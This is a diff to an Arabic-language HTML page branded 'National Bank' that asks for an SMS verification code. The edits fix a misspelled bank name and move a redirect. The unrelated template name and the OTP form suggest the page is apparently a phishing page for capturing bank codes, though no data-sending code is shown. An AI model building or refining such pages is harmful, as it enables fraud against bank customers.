@@ -2,7 +2,7 @@
 <html data-wf-domain="" data-wf-page="678516b9abe6f70728fa8eb9" data-wf-site="678516b9abe6f70728fa8e5f" lang="en">
 <head>
   <meta charset="utf-8"/>
-  <title>Nastioanl bank</title>
+  <title>National Bank</title>
   <meta content="width=device-width, initial-scale=1" name="viewport"/>
   <link href="https://cdn.prod.website-files.com/6709b4ecad0f1ceeeed96305/css/orangemonney.webflow.4d36521a0.css" rel="stylesheet" type="text/css"/>
   <link href="https://fonts.googleapis.com" rel="preconnect"/>
@@ -115,7 +115,7 @@
       <div class="text-block-2">
         التحقق من رقم الموبايل<br/>
         <span class="text-span-9">تم أرسال رمز التحقق عبر الرسائل القصيرة الى:<br/></span>
-        <span id="phonenumber_text" class="text-span-10 light-blue-text">PLACEHOLDER</span>
+        <span id="phonenumber_text" class="text-span-10 light-blue-text"></span>
       </div>
       <div id="verificationForm" class="w-form">
         <form id="wf-form-" name="wf-form-" data-name="التحقق من الامن" method="get" data-wf-page-id="678516b9abe6f70728fa8e5f" data-wf-element-id="79a466c5-9c18-b348-97ed-cbe6dd2fa663">
@@ -187,12 +187,11 @@
         },
         error: function (error) {
           console.error(error);
-          window.location.href = "verification.html";
-    });
         }
       });
 
-      
+      window.location.href = "verification.html";
+    });
   </script>
 </body>
 </html>
